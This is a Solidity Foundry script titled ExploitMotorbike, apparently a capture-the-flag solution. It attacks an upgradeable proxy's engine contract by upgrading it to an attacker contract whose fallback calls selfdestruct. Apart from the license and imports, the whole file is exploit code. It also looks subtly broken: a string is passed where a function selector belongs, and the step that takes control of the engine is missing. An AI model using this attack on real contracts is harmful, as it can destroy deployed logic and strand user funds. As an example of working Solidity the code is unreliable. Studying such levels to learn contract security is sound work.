//SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ExploitMotorbike is Script {
    address constant Motorbike = 0x893448f134aEd53CB138245a7F40757aAb08F237;
    address constant engineAddress = 0xb01520963Dc7F302BcA303042A3D74137FEFa849;
    function run() public {
        uint256 pk = vm.envUint("PK");
        IEngine engine = IEngine(engineAddress);
        ExploitEngine eEngine = ExploitEngine(
            0x3c845d1cFa3264Bc2B8163998523E55D03240467
        );

        vm.startBroadcast(pk);
        engine.upgradeToAndCall(
            address(eEngine),
            abi.encodeWithSelector("fall")
        );
        vm.stopBroadcast();
    }
}

contract ExploitEngine {
    function _destroy() internal {
        selfdestruct(payable(msg.sender));
    }
    fallback() external {
        _destroy();
    }
}

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

interface IMotorbike is IEngine {}
